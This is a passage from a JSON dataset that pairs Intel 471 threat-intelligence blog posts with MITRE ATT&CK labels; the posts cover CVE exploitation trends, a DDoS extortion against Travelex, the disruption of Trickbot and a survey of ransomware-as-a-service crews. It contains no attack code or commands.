Georgia, a neighboring country and a popular holiday destination for Iranians.\nWhile they can be considered revealing, It should be noted that these leaks provide a very narrow window into the full extent of the Iranian regime\u2019s priorities.\nHowever, the information disclosed provides evidence that as time goes by, motivation to expose these activities likely will remain high.", "mitre_ids": ["T1587", "T1587", "T1587", "TA0010", "T1566", "T1091", "T1587", "TA0010", "TA0009", "T1587", "TA0009", "T1566", "TA0009"], "anno_name_label": [["MALWARE", "WinspySuite"], ["MALWARE", "WinspySuite"], ["MALWARE", "WinspySuite"]], "cti_entity_class": ["CE", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI"]}, {"cti_report": "Prioritizing \u201ccritical\u201d vulnerabilities: A threat intelligence perspective\nAug 12, 2020\nBy the Intel 471 Intelligence Analysis team.\nRecently, there have been many vendor security advisories containing multiple critical vulnerabilities potentially impacting organizations that may be conflicted with patch prioritization when looking at the variables seen for each reported vulnerability.\nThreat intelligence can supplement publicly disclosed information and provide a contextual view of exploitation efforts and general interest in open source reported vulnerabilities from an underground threat actor perspective.\nFor instance, our vulnerability intelligence product uses information disclosed by vendor advisories, open source repositories and research companies\u2019 analyses to determine a certain level of risk, but we also take into consideration the scope of underground activity that can be seen surrounding critical vulnerability announcements.\nIt is important to note that our risk assessment is assigned as a probability of current, active exploitation versus organization-specific risk.\nOver the course of a year, we observed consistency across underground activity responding to critical vulnerability disclosures and leading up to exploit development.\nThese indicators could further help identify potential elevation of risk to your organization by recognizing events such as spikes of activity that commonly occur prior to successful exploitation attempts.\nThis is far from a one-size-fits-all approach and won\u2019t necessarily give you an easy-to-prioritize list, but through the examples shown below, you will see this theory applied to recent critical vulnerabilities overlaid with threat actor activity observed over time.\n### Disclosure to exploitation\nAfter the initial open source disclosure of a critical vulnerability that reportedly received the highest severity rating available, a pattern of activity can be observed in the underground.\nThere is an initial surge in posts made by threat actors who copy and paste information directly from open source reports.\nAdditionally, there are several forum threads started where threat actors discuss the possibility of exploitation or seek partners to assist in the development of proof of concept (PoC) and exploit code that leverage the newly announced vulnerability.\nClosely following these discussions, several threat actors will advertise claims of PoCs and exploits that have successfully been developed, however, claims within this timeframe are typically false.\nAfter this initial deluge of information, activity surrounding mentions of the vulnerability slows and there are fewer observed reposts of open source information.\nPaired with this, a few threat actors may advertise high dollar PoCs or exploits in a limited supply.\nFor example, an actor will claim to have an exploit for a recently disclosed critical vulnerability, including the common vulnerabilities and exposures (CVE) ID or its alias in the initial post.\nThe privately developed code will be priced around US $1,000 to US $4,000 and the actor will state only a few copies are available for purchase.\nIt is common to see this activity reported as alleged code development as they would need to be purchased or verified by a reliable secondary source to report them as a source of truth.\nVendors and vulnerability researchers likely would include information of existing credible exploit development and successful exploitation of a vulnerability.\nThese sources also may expedite the development of exploits, such as when you see a successful PoC released after patching information for impacted products is provided by the vendor.\nOnce threat actors share advertisements of code development, publicly available PoCs are not far behind, if not already released.\nIf you are not immediately aware of publicly available code, conversations on the pricey exploit advertisement threads will point to it.\nThreat actors will share links to open source PoCs or exploits in response to the initial sales post and will leave comments such as \u201cthis is a rip off,\u201d \u201cit must be fake, you can get this for free\u201d and more.\nNotably, successful exploit development does not necessarily indicate all interested financially motivated cybercriminals will leverage the vulnerability for attacks.\nWhile there might be an increase in exploitation attempts, many threat actors will lack the sophistication required to take their interest to the next level.\nAs the disclosure to exploit cycle ends, reporting on threat actors successfully leveraging the vulnerability in attack techniques and procedures may be delayed.\nAttackers can be cautious and use nonspecific details if they report initial entry methods at all, such as claiming to leverage a type of vulnerability or only providing the name of the vulnerable system.\nEvidence of this activity allows us to identify threat actors that claim to leverage a specific vulnerability to carry out consistently intrusive cybercriminal activity.\n### Priority indicators to assess risk of exploitation\nThe threat intelligence variables that add contextual risk to critical vulnerability prioritization can be cumbersome if your organization is affected by many recent advisories.\nIn essence, you would be trying to monitor trends for 20 or more high severity vulnerabilities.\nThe observations presented above can be summarized into five indicators that should trigger an increase in priority ranking.\n1.Indicator one \u2013 Extensive coverage in open source reporting.\nThis will naturally increase an actor\u2019s interest in the vulnerability and will not solely be based on the criticality of the reported CVE.\n2.Indicator two \u2013 Increase in observed underground conversations and posts related to the reported vulnerability.\nThis increase will be significant and easily observed in comparison to other vulnerabilities being discussed on underground forums and messaging services.\n3.Indicator three \u2013 Fake and private development and sale of PoC and exploit code.\nThis identifies a clear objective from threat actors seeking to leverage the vulnerability for future attacks.\n4.Indicator four \u2013 Publicly available, legitimate PoC code and threat actors claiming they are attempting to use this code for exploit development.\nPublicly released PoC code will be shared as a link or direct copy-paste on underground forums and referenced across all related initial post threads.\n5.Indicator five \u2013 Full exploit widely available and possibly concurrent claims of the code being implemented in an attack framework.\nAdditionally, you might begin to see reporting on a small number of threat actors leveraging this vulnerability in attacks.\n![](https://d39ec1uo9ktrut.cloudfront.net/blogpic.png)\n### Theory into practice\nUsing the indicators above, you can begin to map these trends across current critical vulnerabilities.\nBelow you will see three critical vulnerabilities reviewed against this patterned activity including a timeline of underground activity and risk score.\n### CVE-2019-19781\nThis Citrix Application Delivery Controller, Citrix Gateway and Citrix SD-WAN WANOP appliance vulnerability, CVE-2019-19781, was disclosed in December 2019 and last updated in the U.S.\nNational Vulnerability Database (NVD) in January 2020.\nIn December 2019, we began to see less sophisticated threat actors share information from open source reports about CVE-2019-19781 and new forum threads started where actors sought to buy an exploit for the vulnerability.\nDiscussions about the potential exploitation of the vulnerability continued until a publicly available exploit was observed in January 2020 and subsequently shared in the underground.\nSeveral exploit variants were circulated by threat actors commonly known for sharing publicly available PoC and exploit code.\nThis vulnerability continues to be high risk to organizations with unpatched affected Citrix systems.\nWe reported on threat actors who claimed this vulnerability allowed them access into vulnerable systems as they attempted to move laterally through impacted networks.\nThe overall risk of exploitation score is high.\n#### December 2019\n* Several actors across multiple popular cybercrime forums posted information from open source reporting about the disclosure of CVE-2019-19781.\n* A long-standing member of the Russian-language underground community started a post thread where the actor advertised funds available to purchase an exploit for the Citrix vulnerability.\nSeveral actors replied expressing a similar interest or discussing exploitability of CVE-2019-19781.\n* A prolific seller of network access possibly leveraged the vulnerability to gain unauthorized network access to several organizations.\nThe assessment was not confirmed but the timing of the disclosure and advertised accesses were concurrent.\n#### January 2020\n* An exploit for the Citrix vulnerability was publicly available.\nAn actor posted the GitHub link on a previously opened post thread and several actors circulated exploits for the vulnerability.\n* An actor shared several code variants for CVE-2019-19781.\nThis actor commonly shares copied PoC and exploit code from open sources including Exploit DB, Packet Storm and GitHub.\n#### February 2020\n* A Russian-speaking actor was suspected to have leveraged the Citrix vulnerability after released compromised access revealed the impacted company uses Citrix System Software, however, the assessment was not confirmed.\n#### May 2020\n* A relatively new actor allegedly leveraged CVE-2019-19781 to sell compromised network accesses on underground forums.\nThe actor claimed to use publicly available code for exploitation after scanning the internet for vulnerable hosts.\n#### June 2020\n* A handful of actors, including a notable threat actor with a positive underground reputation, claimed responsibility for many compromised network accesses likely using the Citrix vulnerability as an initial attack vector into compromised victim organizations.\n###\n### CVE-2020-5902\nThe F5 Traffic Management User Interface (TMUI), also referred to as the Configuration utility, reportedly had an RCE vulnerability in multiple versions of BIG-IP that was disclosed publicly as CVE-2020-5902 June 30, 2020.\nThis vulnerability quickly cycled through the priority indicators of underground activity, which added to the vulnerability\u2019s criticality and overall risk of possible exploitation.\nThe vendor reported the vulnerability with a Common Vulnerability Scoring System (CVSS) of 10.0, the highest score a CVE can receive.\nThe F5 vulnerability allowed unauthenticated attackers or authenticated users with network access to execute arbitrary system commands, create or delete files, disable services and execute arbitrary Java code.\nAlthough the vendor released fixed versions and mitigation information, there was rapid development of exploit code and implementation into an attack framework.\nFollowing common trends, several actors shared information from multiple open source reports that discussed the vulnerability, an actor shared an alleged nmap exploit for CVE-2020-5902.\nOnce a Metasploit module was observed publicly, an actor known for copying code from open sources shared it on an underground forum.\nBecause the vulnerability was quickly productized and there was evidence of threat actors attempting to leverage the CVE in attacks, the overall risk of exploitation score is high.\n#### July 2020\n* Several actors posted information from open source reporting about the disclosure of CVE-2020-5902.\nAn actor posted an alleged nmap exploit for the F5 BIG-IP vulnerability stating: \u201cHere I\u2019m posting nmap script to exploit it.\nI am loving this vulnerability.\n* A notable Turkish-speaking actor shared an exploit and Metasploit module for CVE-2020-5902.\nThe actor commonly shares PoC and exploit code available in open sources including Exploit DB, GitHub and Packet Storm.\n###\n### CVE-2020-1350\nThe Microsoft Windows domain name system (DNS) servers remote code execution (RCE) vulnerability, CVE-2020-1350, was disclosed in July 2020 and is still cycling through the initial priority indicators of observed underground activity.\nThere was an extensive amount of open source coverage of this vulnerability, which referenced risk scoring previously assigned to the BlueKeep vulnerability CVE-2019-0708.\nThe criticality of the vulnerability, impacted vendor, type of vulnerability and widespread reporting of CVE-2020-1350 were indicators of its severity.\nFollowing the outlined behavior, after the disclosure of the vulnerability and released patching information, we observed a near-immediate increase in underground mentions of this vulnerability including rick-rolling PoCs repeatedly shared.\nThere is clear underground interest in CVE-2020-1350 based on threat actor posts seeking to develop code to leverage this vulnerability.\nHowever, a closer look at the actors that expressed an initial interest in leveraging the vulnerability shows no specific historical activity to indicate these individuals are sophisticated enough to carry out an exploitation of the SIGRed vulnerability alone.\nThe activity remains an indicator of increase in risk scoring and probability of exploitation, but there likely will be many follow-on indicators that will press the severity higher.\nThe current overall risk of exploitation score is medium.\n#### July 2020\n* Several threat actors posted information from open source reporting about CVE-2020-1350 and evidence of publicly available imitation PoC code was observed.\n* A relatively new actor started a post thread in a popular English-language cybercrime forum expressing interest in exploring the vulnerability and potentially building something with it, but there was no observed interest in the actor\u2019s post.\nThe actor previously advertised dumped databases obtained by exploiting enterprise resource planning software.\n* A denial of service (DoS) PoC was released publicly on GitHub.\n###\n### Wrap up\nUnderstanding the phases of underground activity driven by critical vulnerability disclosures can contextualize new and existing high-impact CVEs.\nThe five indicators provided above were established based on general trend analysis as a point of reference to assist in developing a priority assessment for critical CVEs.", "mitre_ids": ["T1203", "T1587", "T1203", "T1587", "T1587", "T1190", "T1587", "T1190", "T1587", "T1190", "T1587", "T1190", "T1190", "T1190", "T1190", "T1587", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1190", "T1565", "TA0002", "T1629", "T1059", "T1587", "T1190", "T1587", "T1190", "T1190", "T1499"], "anno_name_label": [], "cti_entity_class": ["CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "Criminals posing as Lazarus Group threatened Travelex: Bitcoin or DDoS\nOct 13, 2020\nA group posing as notorious nation-state-linked hacking group \u201cLazarus Group\u201d threatened to hit British foreign exchange company Travelex with a distributed-denial-of-service (DDoS) attack unless it paid 20 bitcoins.\nAccording to an email discovered by Intel 471 researchers, attackers threatened to hit Travelex with an \u201cextremely powerful\u201d attack that would \u201cpeak over 2 Tbps\u201d until the company paid a ransom.\nThe demand, which was sent in late August, asked for a value of approximately US $213,000.\n\u201cIt's a small price for what will happen when your whole network goes down,\u201d the email read.\n\u201cIs it worth it.\nYou decide.\nFollowing the extortion email, the threat actor conducted a volumetric attack on a custom port of four IP addresses serving the company\u2019s subdomains.\nTwo days later, the attackers carried out another DNS amplification attack against Travelex using Google DNS servers.\nThe email also said that if Travelex didn\u2019t comply by a certain date, the ransom would \u201cincrease by 10 Bitcoin for each day after [the] deadline that passed without payment.\nA bitcoin wallet address in the email shows that Travelex did not pay the attackers at any point.\nWhile it's unclear whether or not the North Korea-backed group was responsible for the note, Intel 471 VP of Intelligence Michael DeBolt says it\u2019s \"unlikely\" to be related to the nation-state.\n\"We've seen this come up quite a few times recently,\" DeBolt said.\n\"The attackers are trying to capitalize on the notoriety of well-known groups as a scare tactic to pressure victims into paying.\nThe true actors or groups likely possess some DDoS capabilities that need to be taken seriously, so organizations should be prepared to deal with that sort of attack as part of their cybersecurity plan.\nThe threat to Travelex comes as the company underwent one of the most notable ransomware attacks of the past year.\nIn January, the company was [hit with REvil ransomware](https://www.cyberscoop.com/travelex-sodinokibi-ransomware/), forcing it to suspend all of its online services, including its app and internal email systems, for several weeks.\nGroups posing as nation-state hacking groups while threatening ransom-backed DDoS attacks have been bubbling up over the past year.\nIn November 2019, New Zealand\u2019s cybersecurity organization, CertNZ, [issued a warning](https://www.cert.govt.nz/it-specialists/advisories/ddos-extortion-campaign-targeting-financial-sector/) about ongoing extortion campaigns targeting companies in the financial sector.\nThe threat actors claimed to represent the Russian hacker group Fancy Bear and demanded a ransom to avoid a DDoS attack.\nAdditionally, the New Jersey Cybersecurity and Communications Integration Cell [issued an advisory](https://www.cyber.nj.gov/alerts-advisories/extortionists-claiming-to-be-apt-groups-threaten-ddos-attacks) in August on actors who targeted the finance and retail sectors with DDoS attacks, claiming to be members of Fancy Bear and Armada Collective.\nNew Zealand-based enterprises [have seen a rash of DDoS attacks](https://www.stuff.co.nz/business/industries/122636840/metservice-anticipates-future-ddos-cyberattacks-in-coming-days) over the past few months.\nIn August, the New Zealand stock exchange was hit by a DDoS attack that spanned several days and caused a disruption of some services.\nThe Meteorological Service of New Zealand, news media company Stuff, public-service radio broadcaster Radio New Zealand and Australian bank Westpac Banking Corp have also been hit with DDoS attacks in recent weeks.", "mitre_ids": ["G0032", "T1499", "G0032", "T1499", "T1499", "T1499", "T1486", "S0496", "T1486", "T1499", "G0007", "T1499", "T1499", "G0007", "T1499", "T1499", "T1499", "T1499"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE"]}, {"cti_report": "That was quick: Trickbot is back after disruption attempts\nOct 15, 2020\nThe Trickbot botnet looks to be working once again, despite separate efforts in the past few weeks aimed at disrupting its operation.\nOn October 14, 2020, the Emotet spam botnet \u2014 which is often the precursor to TrickBot being loaded onto a system \u2014 began receiving spam templates intended for mass distribution.\nThese spam templates contained a Microsoft Word document attachment with malicious macros that fetch and load a copy of Emotet onto the victim machine.\nThe Emotet bots reached out to their controllers and received commands to download and execute Trickbot on victim machines.\nThe Trickbot group tag that Intel 471 identified is tied to a typical infection campaign that information security researchers have been observing for the past 6 months or more.\nAdditionally Intel 471 researchers saw an update to the Trickbot plugin server configuration file.\nFifteen server addresses were added, and two old servers were retained in the configuration, along with the server\u2019s .onion address.\nThis was likely done as a fix that would help operators maintain that their infrastructure remains operational.\nThe fix is another round in the back-and-forth between Trickbot\u2019s operators and the separate parties that have attempted to disrupt the botnet\u2019s actions.\nOn Oct. 10, 2020, the Washington Post [reported](https://www.washingtonpost.com/national-security/cyber-command-trickbot-disrupt/2020/10/09/19587aae-0a32-11eb-a166-dc429b380d10\\_story.html) that \u201cfour U.S. officials\u201d claimed U.S.\nCyber Command was conducting an operation to disrupt Trickbot.\nThis action, [first reported by Brian Krebs](https://krebsonsecurity.com/2020/10/attacks-aimed-at-disrupting-the-trickbot-botnet/) on Oct. 2, 2020, was identified by Intel 471\u2019s Malware Intelligence systems on Sept. 22, 2020.\nAdditionally, Microsoft issued a [public statement](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/) on Oct. 12, 2020 that it had taken legal action to \u201ccombat ransomware ahead of U.S. elections.\nThe legal action involved Microsoft attempting to disrupt a number of Trickbot command and control server IP addresses that are in the United States.\nThe fact that Trickbot has resumed normal operations despite the best efforts of U.S.\nCyber Command and Microsoft shows how resilient of an operation Trickbot is and how much more effort is needed to fully take the botnet offline for good.\nThe botnet\u2019s operators have all the IT support of legitimate enterprises \u2014 continuity planning, backups, automated deployment, and a dedicated workforce \u2014 that allow them to quickly react to disruptive measures.\n\u201cAbout 10 years ago it was much easier to completely take over or significantly disrupt a botnet, but cybercriminals are students of takedowns and have learned to make their operations more resilient to takedown efforts,\u201d said Intel 471 COO Jason Passwaters.\n\u201cThat's why every takedown attempt has some potential of giving ground to the adversary.\nYou're teaching them where the weaknesses in their armor are and they have a team of developers ready to act on that information.\nSo unless you strike a killing blow, you're not going to impact them long term.\nWhile the actions taken this past week let Trickbot\u2019s operators know they are not operating free of consequence, an multi-pronged effort needs to be made if the botnet is to be fully knocked offline:\n* Law enforcement efforts should be multinational and focus on arresting the core operators of the botnet.\n* Any further efforts to disrupt infrastructure should focus on the main infrastructure, not just that of countries where a court order is needed.\n* Governments and companies should work together on mass \u201cde-infection\u201d campaigns, similar to those used to eliminate the [Bredolab botnet in 2010](https://www.zdnet.com/article/dutch-police-take-down-bredolab-botnet/) and [Retadup botnet in 2019](https://decoded.avast.io/janvojtesek/putting-an-end-to-retadup-a-malicious-worm-that-infected-hundreds-of-thousands/).\nWhether this is a realistic endeavor in today\u2019s world is another question altogether.", "mitre_ids": ["S0266", "S0266", "S0367", "S0183", "T1566", "T1566", "T1566", "S0367", "T1204", "T1105", "S0367", "S0266", "T1105", "S0266", "S0266", "S0266", "S0266", "T1486", "S0266", "TA0011", "S0266", "S0266", "S0266"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Trickbot down, but is it out?\nNov 10, 2020\nSummary\n-------\nSince the separate and independent actions taken against Trickbot, we have observed successful disruption of its command and control infrastructure.\nHowever, the actors linked to Trickbot have not ceased their criminal activities.\nThese actors have continued engaging in ransomware activity, using BazarLoader instead of Trickbot.\nWe are unable to assess the long-term impact of the Trickbot disruption activity or whether Trickbot will continue to be used by cybercrime groups.\nThis analysis covers the period from Sept. 22, 2020 until Nov. 6, 2020.\nThe battle begins: Sept. 22 - Oct. 12, 2020\n-------------------------------------------\nThe first blow Intel 471 observed was believed to be struck by the U.S. Cyber Command [[1](https://www.washingtonpost.com/national-security/cyber-command-trickbot-disrupt/2020/10/09/19587aae-0a32-11eb-a166-dc429b380d10\\_story.html)] on Sept. 22, 2020.\nUtilizing their access to Trickbot command and control servers, Cyber Command operators are believed to have modified several Trickbot configuration files that were sent by their C&C infrastructure to Trickbot-infected systems.\nTheir actions were believed to be intended to render the bots unable to communicate with Trickbot\u2019s control servers.\nResponding to this disruption, Trickbot operators stabilized their operation within 24 hours, restoring working configuration files on their command and control servers.\nCyber Command struck again, poisoning the Trickbot configuration files for a second time.\nThis time the botnet operators needed more time to restore their servers.\nThe impact of this action was a loss of an unknown number of bots from their botnet.\nHowever, the actors linked to Trickbot are efficient at identifying high-value targets from within their pool of already compromised systems and using second-stage tools such as Cobalt Strike to maintain persistent access to these networks.\nAs a result, the actors maintained access to systems where they already were engaged in follow-on intrusion activity.\n![](https://d39ec1uo9ktrut.cloudfront.net/Trickbot-down-blog-Image-1.png)\nThe image reflects the poisoned Trickbot plug-in server configuration.Microsoft joins the fray: Oct. 12, 2020\n---------------------------------------\nIt was unclear exactly when Microsoft began their own action against Trickbot, but they announced their action publicly on Oct. 12, 2020 [[2](https://blogs.microsoft.com/on-the-issues/2020/10/12/trickbot-ransomware-cyberthreat-us-elections/)].\nUnsealed indictments contained a list of IP addresses that Intel 471 identified as belonging to Trickbot or Bazar control server infrastructure [[3](https://noticeofpleadings.com/trickbot/)].\nIn that indictment, Microsoft appealed to the court to order U.S. hosting companies responsible for hosting Trickbot controller infrastructure to shut down the infrastructure and \u201ctransfer any content and software hosted at the IP addresses\u201d to Microsoft.\nHowever, we believe Microsoft also successfully impacted Trickbot\u2019s infrastructure that was outside the jurisdiction of U.S. courts.\nWar of attrition: Oct. 13 - Nov. 1, 2020\n----------------------------------------\nFrom Oct. 13, 2020, to Nov. 1, 2020, we began to see the impact of Microsoft's takedown actions against Trickbot\u2019s infrastructure.\nDuring this period, we observed that a significant amount of Trickbot\u2019s infrastructure was rendered inoperable while the Trickbot operators were setting up new infrastructure in response.\nThis allowed Trickbot to maintain an active and working command and control infrastructure, which was degraded significantly compared to the previous month prior to any action.\nDuring this time, Trickbot operators also initiated new infection campaigns via the Emotet malware-as-a-service (MaaS) (see: screenshot below) and other mass-spam sources to rebuild their botnet.\n![](https://d39ec1uo9ktrut.cloudfront.net/Trickbot-down-blog-Image-2.png)\nTrickbot was distributed by the Emotet service Oct. 19, 2020.\nCurrent state of affairs: Oct. 28 - Nov. 6, 2020\n------------------------------------------------\nBetween Oct. 28, 2020 and Nov. 6, 2020, we have not seen any new Trickbot infection campaigns in our monitoring nor in open source reporting.\nWe observed the number of active and working Trickbot control servers being reduced over time and we were unable to identify any working Trickbot control servers as of Nov. 6.\n![](https://d39ec1uo9ktrut.cloudfront.net/Trickbot-down-blog-Image-3.png)\nThe number of active Trickbot control servers diminished in October 2020.\nBazarLoader instead of Trickbot.\n--------------------------------\nReports from security researchers [[4](https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/)][[5](https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html)] and the U.S.\nCybersecurity and Infrastructure Security Agency (CISA) indicate a recent resurgence of ransomware incidents involving the Ryuk ransomware.\nThis strain of ransomware was frequently linked to Trickbot by security researchers [[6](https://unit42.paloaltonetworks.com/ryuk-ransomware/)].\nIn these recent Ryuk attacks, incident responders have reported that instead of seeing Trickbot in the initial stages of an incident, they saw a different malware known as BazarLoader aka KEGTAP.\nBazarLoader is linked to the Trickbot operators in many ways, including shared infrastructure and code similarities.\nThis indicates the actors linked to Trickbot continue to launch targeted ransomware attacks successfully despite the disruption of the Trickbot infrastructure.\nIt was unclear whether the Trickbot operators will return to using Trickbot or will completely move to using BazarLoader as a replacement.\nRegardless of the switch from Trickbot to BazarLoader, we are encouraged by the overall impact of disruption activity against Trickbot\u2019s infrastructure.\nAt the very least, this disruption activity caused the actors behind Trickbot to spend time and effort setting up new infrastructure instead of impacting and ransoming victims.\nUpdate - Nov. 10, 2020\n----------------------\nThis blog post covers the period Sep 22, 2020 to Nov 6, 2020.\nOn Nov 9, 2020, we did see a new version of Trickbot that was distributed via a spam campaign (gtag tar2).\n##### [1] [2] [3] [4] [5] [6]", "mitre_ids": ["S0266", "S0266", "TA0011", "S0266", "T1486", "S0534", "S0266", "S0266", "S0266", "S0266", "TA0011", "S0266", "T1105", "S0266", "S0266", "TA0011", "S0266", "S0266", "S0154", "T1105", "S0266", "S0266", "S0266", "S0534", "S0266", "TA0011", "S0266", "TA0011", "S0266", "S0266", "S0266", "S0266", "S0266", "TA0011", "S0266", "S0367", "S0266", "S0367", "S0266", "TA0011", "TA0011", "TA0011", "S0534", "S0266", "T1486", "S0446", "T1486", "T1486", "S0266", "S0446", "S0266", "S0534", "S0534", "S0266", "S0266", "T1486", "S0266", "T1486", "S0266", "S0266", "S0534", "S0266", "S0534", "S0266", "S0266", "S0266", "T1566"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Ransomware-as-a-service: The pandemic within a pandemic\nNov 16, 2020\nRansomware is a massive problem.\nBut you already knew that.\nTechnical novices, along with seasoned cybersecurity professionals, have witnessed over the past year a slew of ransomware events that have devastated enterprises around the world.\nEven those outside of cybersecurity are now familiar with the concept: criminals behind a keyboard have found a way into an organization\u2019s system, prevented anyone from actually using it by locking it up, and won\u2019t let anyone resume normal activity until the organization pays a hefty fee.\nAs economies around the world teeter on the edge of disaster as a result of the COVID-19 pandemic, the onslaught of ransomware attacks in 2020 has compounded civil society\u2019s ability to carry on business as usual.\nCorporations, governments, schools and everything in between have constantly been in the crosshairs of underground criminal groups, often left with very little recourse if they find their systems have been locked.\nThat lack of recourse doesn\u2019t mean there\u2019s an absence of effort to beat the bad guys.\nBut even for seasoned professionals, it\u2019s a challenge to measure and quantify just how bad ransomware has gotten.\nWhile incidents continue to come to light, there is a lot the cybersecurity industry doesn\u2019t know: the volume of attacks, average cost of remediation and organizations who choose to stay silent once an attack has occurred.\nWhat is known is that the criminal groups behind ransomware are flourishing, creating new variants and offering access on underground markets to anyone that has access to corporate networks and a desire to make a substantial amount of illicit money.\nIntel 471 has been tracking over 25 different ransomware-as-a-service crews over the past year, ranging from well-known groups that have become synonymous with ransomware, to newly-formed variants that have risen from the failures of old, to completely new variants that may have the ability to unseat the current top-level cabals.\nThe following is an examination of Ransomware-as-a-service (RaaS) crews that have grown over the past year.\nThis is not meant to be a definitive measure of the ransomware scene, as what could be considered \u201cdamaging\u201d \u2014 payment amount, system downtime, communications with attackers \u2014 could vary by crew or incident.\nAdditionally, there are known private gangs operating in tight, close-knit criminal circles using direct and private communication channels that we have little visibility into.\nWhat we are aiming to do is shine light on an area where relative darkness has led to a staggering amount of criminals running roughshod over enterprises, escaping with people\u2019s hard-earned money while facing very limited consequences.\nBy speaking publicly on these operations, society as a whole can get a better understanding of the rising problem at hand.\n**TIER 3: Emerging RaaS Crews**\nWe can verify that the following variants have been created and are being sold on a RaaS model, but at the present time, there is limited to no information on successful attacks, volume of attacks, payments received or cost of mitigation.\n| Name | Date Discovered | Notable Incidents | Markets Sold | Blog |\n| --- | --- | --- | --- | --- |\n| CVartek.u45 | March 2020 | None | Torum | No |\n| Exorcist | July 2020 | None | XSS | No |\n| Gothmog | July 2020 | None | Exploit | No |\n| Lolkek | July 2020 | None | XSS | No |\n| Muchlove | April 2020 | None | XSS | No |\n| Nemty | September 2020 | None | XSS | Yes |\n| Rush | July 2020 | None | XSS | No |\n| Wally | February 2020 | None | Nulled | No |\n| XINOF | July 2020 | None | Private Telegram channel | No |\n| Zeoticus | 1.0 Dec. 2019, 2.0 Sept 2020 | None | XSS/Private channels | No |\n**TIER 2: Rising Powers**\nThe following variants have been tied to a number of confirmed attacks, the frequency of which have grown over 2020.\nA number of these variants have utilized blogs to \u201cname and shame\u201d victims who have refused to pay ransoms.\n| Name | Date Discovered | Attack claims | Markets Sold | Blog |\n| --- | --- | --- | --- | --- |\n| Avaddon | March 2020 | Under 10 | Exploit | Yes |\n| Conti | August 2020 | 142 | Private | Yes |\n| Clop | March 2020 | Over 10 | N/A | Yes |\n| DarkSide | August 2020 | Under 5 | Exploit | Yes |\n| Pysa/Mespinoza | August 2020 | Over 40 | N/A | Yes |\n| Ragnar | December 2019 | Over 25 | Exploit | Yes |\n| Ranzy | October 2020 | 1 | Exploit & XSS | Yes |\n| SunCrypt | October 2019 | Over 20 | Mazafaka | Yes |\n| Thanos | August 2020 | Over 5 | Raid | No |\n**TIER 1: Most Wanted**\nThese variants are among the most utilized, constantly showing up in enterprises that have been publicly linked to an attack.\nThe variants are often iterations of past RaaS operations that were either shut down or broken up by law enforcement.\nAll of these variants have utilized blogs to \u201cname and shame\u201d victims who have refused to pay ransoms.\nIn all, these variants have pulled in hundreds of millions in ransoms -- a figure that may be low due to the lack of reporting surrounding enterprises payment to crews.\n**DoppelPaymer**\nDoppelPaymer, around since 2019, is associated with the BitPaymer aka FriedEx ransomware.\nCrowdStrike has highlighted some similarities between those variants, speculating that DoppelPaymer might be the work of the former BitPaymer group members.\nThe ransomware itself is usually deployed manually after a network is compromised and sensitive data is exfiltrated.\nThe DoppelPaymer team operates a Tor-based \u201cDopple leaks\u201d blog, which is used to publish information about compromised companies and their stolen data.\nThe crew is behind such notable attacks as those on Mexican energy giant Pemex and an IT contractor that works with the U.S. federal government.\nThe most known and discussed victim of DoppelPaymer ransomware is one against D\u00fcsseldorf University Clinic in September 2020.\nThe actors actually wanted to target the D\u00fcsseldorf University and addressed it in the ransom note, but ended up hitting the hospital.\nWhen the perpetrators were made aware, they sent a digital key to get the hospital up and running again.\nDoppelPaymer has been used in over 125 ransomware incidents in 2020.\n**Egregor/Maze**\nAs this report was being published, the crew behind the Maze ransomware service announced it was shutting down its operations.\nThere has been speculation that this group\u2019s affiliates will likely be funneled into the services behind Egregor ransomware.\nEgregor follows a familiar pattern in its operations:\nCompromise corporate networks to steal sensitive data and deploy ransomware, communicate with victims and demand ransoms, then dump sensitive data on a blog when victim organizations refuse to pay the ransom.\nThere is evidence that Egregor is also linked to Sekhmet ransomware.\nIntel 471 researchers found Egregor contained the same Base64 encoded data as Sekhmet where the last row contained additional parameters from a compromised system.\nResearchers also found that Egregor ransom notes were strikingly similar to ones used with Sekhmet.\nEgregor was found in incidents at Crytek, Ubisoft and Barnes & Noble.\nIntel 471 found that Maze was used in over 250 ransomware incidents in 2020.\nEgregor was used in more than 200 incidents.\n**Netwalker**\nFirst detected in September 2019, NetWalker is one of the more prolific affiliate services Intel 471 has tracked.\nThe actors behind it have spent 2020 using phishing emails that leverage the impact and fear of the COVID-19 pandemic to lure victims into loading their malware onto systems.\nIn May, the operators launched a Tor-based blog to release sensitive data stolen from victim organizations that refused to pay the requested ransom.\nThe actors used a fileless infection technique and allegedly could bypass the user account control component of Windows 7 and newer operating systems.\nNetWalker could be operated in two modes: In \u201cnetwork mode,\u201d individual computers or the entire network could be held for ransom and the victim could purchase a decryption tool with a master key or buy the necessary keys to decrypt certain computers.\nIn \u201cindividual mode\u201d, a ransom was demanded for a single computer at a time.\nThe most high-profile target hit by Netwalker is Michigan State University, which refused to pay the 